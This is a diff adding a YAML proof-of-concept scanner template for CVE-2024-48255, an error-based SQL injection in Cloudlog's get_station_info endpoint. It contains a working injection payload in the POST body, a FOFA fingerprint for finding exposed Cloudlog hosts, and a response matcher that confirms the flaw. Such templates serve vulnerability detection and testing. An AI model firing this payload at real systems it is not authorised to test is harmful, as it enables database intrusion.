@@ -1,0 +1,22 @@
+id: poc-yaml-cloudlog-oqrs-get-station-sqli
+info:
+  name: Cloudlog get_station_info SQL注入（CVE-2024-48255）
+  severity: high
+  tags:
+  - 两高一弱
+  - sql-injection
+  - CVE-2024-48255
+  finger: cloudlog
+  fofa: body="Login to Cloudlog"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /index.php/oqrs/get_station_info
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: station_id=1 and GTID_SUBSET(CONCAT((SELECT(md5({{.t1}})))),3119)
+  expression: "status_code == 500 && \ncontains(body,t2) &&\ncontains(body,\"Database\
+    \ Error\")\n"
+transport: http
